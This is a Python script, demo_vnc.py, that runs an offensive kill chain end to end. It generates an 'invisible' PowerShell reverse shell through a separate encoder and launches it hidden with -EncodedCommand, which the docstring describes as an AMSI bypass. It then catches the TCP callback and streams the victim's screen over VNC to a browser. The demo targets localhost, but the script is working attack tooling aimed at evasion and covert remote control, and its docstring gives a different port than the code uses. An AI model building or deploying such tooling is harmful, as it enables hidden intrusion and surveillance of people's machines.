"""
demo_vnc.py — One-command VNC chain demo.

1. Starts TCP server on port 4445
2. Builds invisible PS1 reverse shell targeting 127.0.0.1:4445
3. Launches PS1 via -EncodedCommand (production path, AMSI bypass)
4. Accepts TCP callback
5. Hands connection to watch_session() -> HTTP :8892 -> opens browser
"""
import sys, os, socket, threading, base64, subprocess, time

ROOT = os.path.dirname(os.path.abspath(__file__))
SHELL_DIR = os.path.join(ROOT, "shell")
GHOST_DIR = os.path.join(ROOT, "ghost-encoder")

DEMO_PORT = 4443   # known-working port from kill chain test

def build_ps1_b64(ip, port):
    """Build invisible PS1 via ghost_encode.py CLI (same path as test_local_chain.py)."""
    out = os.path.join(SHELL_DIR, "_vnc_demo.ps1")
    env = {**os.environ, "PYTHONIOENCODING": "utf-8"}
    subprocess.run(
        [sys.executable, os.path.join(GHOST_DIR, "ghost_encode.py"),
         "--shell", ip, str(port), "--invisible", "-o", out],
        cwd=GHOST_DIR, env=env, capture_output=True, timeout=30
    )
    if not os.path.exists(out):
        raise RuntimeError(f"PS1 not generated at {out}")
    with open(out, encoding="utf-8") as f:
        ps1 = f.read()
    if ps1.startswith("﻿"):
        ps1 = ps1[1:]
    return base64.b64encode(ps1.encode("utf-16-le")).decode("ascii")

def main():
    print("\033[32m[*] Building invisible PS1 (VNC-capable)...\033[0m", flush=True)
    b64 = build_ps1_b64("127.0.0.1", DEMO_PORT)
    print(f"\033[32m[+] PS1 encoded ({len(b64)//1024}KB)\033[0m", flush=True)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", DEMO_PORT))
    except OSError as e:
        print(f"\033[31m[!] Bind failed: {e} — kill existing :4443 listener first\033[0m", flush=True)
        sys.exit(1)
    srv.listen(1)
    print(f"\033[32m[*] TCP listener on :{DEMO_PORT}\033[0m", flush=True)

    # launch payload in background thread
    def fire():
        time.sleep(0.5)
        subprocess.Popen(
            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-EncodedCommand", b64],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print("\033[32m[*] Payload fired via -EncodedCommand\033[0m", flush=True)
    threading.Thread(target=fire, daemon=True).start()

    print("\033[33m[*] Waiting for TCP callback (45s)...\033[0m", flush=True)
    srv.settimeout(45)
    conn, addr = srv.accept()
    print(f"\033[32m[+] TCP callback from {addr}\033[0m", flush=True)

    # read banner
    conn.settimeout(5)
    try:
        banner = conn.recv(64)
        print(f"\033[32m[+] Banner: {banner.decode('utf-8', errors='replace')}\033[0m")
    except Exception:
        pass

    print("\033[35m[*] Starting VNC stream -> http://127.0.0.1:8892\033[0m")
    from watch_stream import watch_session
    watch_session(conn, target_label=f"localhost:{DEMO_PORT}")

if __name__ == "__main__":
    main()
